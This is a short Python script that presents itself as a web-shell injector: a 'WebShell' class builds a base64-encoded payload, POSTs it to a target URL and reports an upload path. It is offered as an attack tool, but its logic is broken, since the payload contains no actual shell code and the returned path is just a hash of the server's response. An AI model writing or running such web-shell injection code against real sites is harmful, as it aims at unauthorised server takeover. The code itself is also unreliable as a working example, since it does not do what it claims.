import os
import base64
import requests
import json
import time
import hashlib

class WebShell:
    def __init__(self, password):
        self.password = password

    def generate_payload(self):
        script_name = f"{time.time()}.php"
        encoded_script = base64.b64encode(script_name.encode()).decode()
        encoded_password = base64.b64encode(self.password.encode()).decode()

        payload = {
            "scriptName": encoded_script,
            "password": encoded_password
        }

        return json.dumps(payload)

    def inject_payload(self, target_url):
        web_shell_code = self.generate_payload()
        response = requests.post(
            url=target_url,
            headers={"Content-Type": "application/json"},
            data=web_shell_code
        )

        if response.status_code == 200:
            script_hash = hashlib.sha256(response.text.encode()).hexdigest()
            return f"{target_url}/uploads/{script_hash}"
        else:
            raise Exception('WebShell Injection Failed')

if __name__ == "__main__":
    password = 'your_password_here'
    web_shell_instance = WebShell(password)
    vulnerable_dir = web_shell_instance.inject_payload('http://example.com')
    print(f"Web shell uploaded to: {vulnerable_dir}")
